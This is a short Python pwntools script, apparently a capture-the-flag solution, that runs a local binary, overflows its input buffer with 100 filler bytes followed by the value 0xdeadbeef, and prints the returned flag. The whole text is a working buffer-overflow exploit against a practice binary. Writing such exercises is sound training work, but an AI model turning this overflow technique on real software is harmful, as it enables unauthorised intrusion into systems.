from pwn import *
#context.log_level = 'debug'

t = process("./bin")
t.send('a'*100+p32(0xdeadbeef))

flag =  t.recv()

log.success('get flag:'+flag)
